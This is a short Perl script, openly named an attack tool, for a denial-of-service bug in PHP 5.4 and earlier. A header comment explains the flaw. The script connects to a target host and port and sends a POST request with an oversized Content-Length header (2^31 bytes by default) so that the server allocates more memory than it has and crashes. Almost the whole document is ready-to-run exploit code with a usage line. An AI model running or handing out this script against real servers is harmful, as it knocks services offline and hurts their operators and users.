#!/usr/bin/env perl
# *************************************************************************** #
# There are an amazing (no) bug with PHP versions 5.4 and under:              #
# If client sends wrong POST-request with too big 'Content-length',           #
# the server gives the query to the PHP interpreter and it allocates          #
# 'Content-length' bytes in RAM, and only then check the query correctness.   #
# So if send 'Content-length' more than RAM size at server it will drop.      #
# *************************************************************************** #
use strict;
use warnings;
use Socket;

sub attack {
    my $DEFAULT = 1 << 31;
    my ($host, $port, $conlen) = (shift || "localhost/", shift || 80, shift || $DEFAULT);
#    my ($page) = ($host =~ m/(\/.*)/);
#    $host =~ s/(\/.*)//;
    my $page = "";
    ($host, $page) = ($host =~ m/([^\/]*)(\/.*)/);
    my $query = "POST $page HTTP/1.1\r\n"
              . "Host: $host\r\n"
              . "Content-Type: application/x-www-form-urlencoded\r\n"
              . "Content-Length: $conlen\r\n"
              . "\r\n"
              . "php_is_awful=true\r\n"
              . "\r\n";
    socket(my $sock, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
    connect($sock, sockaddr_in($port, inet_aton($host)));
    send($sock, $query, 0);
    my $ans = join("", <$sock>);
    print $ans;
    close($sock);
}

sub main {
    if ($#_ == -1) {
        print "Usage: attack [site]/[page] [port] [attack-buffer length]\n";
        return -1;
    }
    attack(@_);
    return 0;
}

exit(main(@ARGV));
